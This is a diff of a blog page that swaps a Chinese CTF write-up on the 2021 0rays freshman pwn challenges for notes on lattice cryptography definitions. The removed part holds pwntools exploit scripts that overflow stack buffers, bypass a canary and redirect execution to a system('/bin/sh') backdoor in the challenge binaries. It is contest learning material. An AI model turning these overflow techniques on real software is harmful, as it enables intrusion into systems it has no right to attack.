@@ -13,7 +13,7 @@
 
 
 
-<title>2021_0rays新生赛 | hash_hash的博客</title>
+<title>A Decade of Lattice Cryptography | hash_hash的博客</title>
 
 
 
@@ -231,7 +231,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">2021_0rays新生赛</h1>
+            <h1 class="post-title">A Decade of Lattice Cryptography</h1>
             
                 <div class="post-meta">
                     
@@ -240,57 +240,48 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">May 18, 2022&nbsp;&nbsp;22:03:31</a>
+                        Date: <a href="#">September 30, 2022&nbsp;&nbsp;10:05:23</a>
                         </span>
                     
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Cryptography/">Cryptography</a>
+                            
+                        </span>
                     
                 </div>
             
         </header>
 
         <div class="post-content">
-            <p>找的nameless师傅他们学校去年新生赛的题目做了做，收获不小，gdb使用有了长进</p>
-<p><a target="_blank" rel="noopener" href="http://training.0rays.club/challenges">题目地址</a></p>
-<p>环境关了，下载附件本地打打</p>
-<h2 id="QvQ"><a href="#QvQ" class="headerlink" title="QvQ"></a>QvQ</h2><img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic1.png" class>
-
-<p>简单覆盖，构造payload使条件满足即可，注意strcmp是\x00截断</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./QvQ&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x39</span>-<span class="number">0x31</span>)+<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0xc</span>)+p32(<span class="number">135797531</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q-Q"><a href="#Q-Q" class="headerlink" title="Q_Q"></a>Q_Q</h2><p>这个题纠正了我一个误区，我一直以为strcmp遇到\x00只比较\x00前面的字符是否相等，结果查了下源码是比较的\x00及前面的所有字符</p>
-<p>gdb调试的时候查看一下s1地址的内存</p>
-<img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic2.png" class>
-
-<p>截止到\x00也就是把前20字节输入</p>
-<p>后面只需覆盖一个四字节整数即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./Q_Q&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1=p32(<span class="number">0x11756f79</span>)+p32(<span class="number">0x6465656e</span>)+p32(<span class="number">0x6e777022</span>)+p32(<span class="number">0x6c6f6f74</span>)+p32(<span class="number">0x00332173</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1f</span>-<span class="number">0xc</span>)+p32(<span class="number">135797531</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="QAQ"><a href="#QAQ" class="headerlink" title="QAQ"></a>QAQ</h2><img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic3.png" class>
-
-<p>F5反编译出来的东西少了流程，得自己看看汇编</p>
-<img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic4.png" class>
-
-<p>我们可以看的strcmp后如果返回值为0则跳转</p>
-<img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic5.png" class>
-
-<p>这里相当于一个后门但是没在反编译的时候编译成函数，可以看到需要满足[ebp+var_44]&#x3D;1b最后才能执行system(‘&#x2F;bin&#x2F;sh’)，这样我们就往前看看哪个地方能够改到[ebp+var_44]</p>
-<img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic6.png" class>
-
-<p>这里看到call read后会把[ebp+arg_0]赋给[ebp+var_44]，所以我们只需要覆盖[ebp+arg_0]为1b即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./QAQ&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x37</span>)+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x37</span>)+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="built_in">len</span>(payload))+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+p32(<span class="number">0x1b</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="T-T"><a href="#T-T" class="headerlink" title="T^T"></a>T^T</h2><img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic7.png" class>
-
-<p>func1和func2两函数但是func1有输入func2无输入，要求func2栈内的某个变量为要求值</p>
-<p>这里需要了解栈帧的结构，由main调用的子函数都是在main的栈帧的低地址接着开辟一段新栈帧，于是func1和func2会有共用的同一段栈内存，且退栈的时候只是移动esp并不会抹除栈段数据，所以我们可以通过func1的输入对func2中v1所存值进行修改，gdb看一下相对位置即可</p>
-<p>然后就是栈溢出了，可是没能打通，然后去读汇编会发现最后返回时执行了以下操作</p>
-<img src="/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/pic8.png" class>
-
-<p>需要了解</p>
-<p>mov后加中括号为取地址内存，lea后寄存器必须加中括号，为取值</p>
-<p>最后esp存的是[ebp+var_4]-4的内容，这也是为什么一开始把backdoor的地址赋给了一个全局变量，于是我们将这个地址填到bss段上的存backdoor地址的全局变量地址加4即可，之后pop eip就是把esp所指向地址的内存压到eip里，即可执行backdoor函数了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./TT&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">backdoor=<span class="number">0x804B01C</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0x14</span>)+p32(<span class="number">123454321</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">0xc</span>)+p32(canary)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(backdoor+<span class="number">4</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+            <p>差不多是论文的一些摘记吧</p>
+<p><a href="extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Feprint.iacr.org%2F2015%2F939.pdf">paper</a></p>
+<p>基于格的密码系统的一些特性</p>
+<ul>
+<li>Conjectured security against quantun attacks</li>
+<li>Algorithmic simplicity, efficiency, and parallelism</li>
+<li>Strong security guarantees from worst-case hardness</li>
+<li>Constructions of versatile and powful cryptographic objects</li>
+</ul>
+<p><strong>The Dual lattice</strong></p>
+<p>the dual lattice of a lattice $L⊆R^n$ is defined as $L^※:&#x3D;\left{w:&lt;w,L&gt;⊆Z\right}$</p>
+<p><strong>Orthogonal lattice</strong></p>
+<p>The orthogonal lattice of a lattice $L∈Z^m$ is  $L^⊥&#x3D;\left{v∈Z^m|∀b∈L,&lt;v,b&gt;&#x3D;0\right}$</p>
+<h3 id="Computational-Problems"><a href="#Computational-Problems" class="headerlink" title="Computational Problems"></a><strong>Computational Problems</strong></h3><p><strong>Shortest Vector Problem</strong></p>
+<p>Given an arbitrary basis B of some lattice $L&#x3D;L(B)$, find a shortest nonzero lattice vector.</p>
+<p><strong>Approximate Shortest Vector Problem</strong></p>
+<p>Given a basis B of an n-dimensional lattice $L&#x3D;L(B)$, find a nonzero vector $v∈L$ for which $‖v‖≤γ(n)·\lambda_1(L)$ .</p>
+<p><strong>Decisional Approximate SVP</strong></p>
+<p>Fixed d,whether exit a vector $v∈L$ for which $γ(n)·‖v‖≤d$</p>
+<p><strong>Approximate Shortest Independent Vectors Problem</strong></p>
+<p>Given a basis B of a full-rank n-dimensional lattice $L&#x3D;L(B)$, output a ser $S&#x3D;\left{s_i\right}⊆L$ of n linearly independent lattice vector where $‖s_i‖≤γ(n)·\lambda_n(L)$ for all i.</p>
+<p><strong>Bounded Distance Decoding Problem</strong></p>
+<p>Given a basis B of an n-dimensional lattice $L&#x3D;L(B)$ and a target point $t∈R^n$ with the guarantee that $dist(t,L)&lt;d$, find the unique lattice vector $v∈L$ such that $‖t-v‖&lt;d$.</p>
+<p><strong>Gaussians</strong></p>
+<p>For any positive integer n and real s&gt;0, which is taken to be s&#x3D;1 when omitted, define the Gaussian function $\rho_s:R^n→R^+$ of parameter s as $\rho_s(x):&#x3D;e^{-\pi‖x‖^2&#x2F;s^2}$ </p>
+<p>the continuous Gaussian distribution $D_s$ of parameters over $R^n$ is defined to have probability density function proportional to $\rho_s$, $f(\vec{x}):&#x3D;\rho_s(\vec{x})&#x2F;s^n$</p>
 
         </div>
 
@@ -305,7 +296,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://hash-hash.github.io/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/">https://hash-hash.github.io/2022/05/18/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/</a></span>
+                        <span><a href="https://hash-hash.github.io/2022/09/30/A-Decade-of-Lattice-Cryptography/">https://hash-hash.github.io/2022/09/30/A-Decade-of-Lattice-Cryptography/</a></span>
                     </p>
                 
                 
@@ -328,6 +319,10 @@
                 <span>Tag(s):</span>
                 <span class="tag">
                     
+                    
+                        <a href="/tags/lattice/"># lattice</a>
+                    
+                        
                 </span>
             </div>
             <div>
@@ -338,10 +333,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2022/05/25/%E4%B8%8D%E5%B1%95%E7%A4%BA%E6%96%87%E6%A1%A3/Dest0g3%E8%BF%8E%E6%96%B0%E8%B5%9B/">Dest0g3迎新赛</a>
             
-            
-            <a class="next" rel="next" href="/2022/05/18/%E4%B8%8D%E5%B1%95%E7%A4%BA%E6%96%87%E6%A1%A3/20210rays%E6%96%B0%E7%94%9F%E8%B5%9B/">2021_0rays新生赛</a>
+            <a class="next" rel="next" href="/2022/09/13/%E4%B8%8D%E5%B1%95%E7%A4%BA%E6%96%87%E6%A1%A3/ocb-mode/">ocb mode</a>
             
         </section>
 
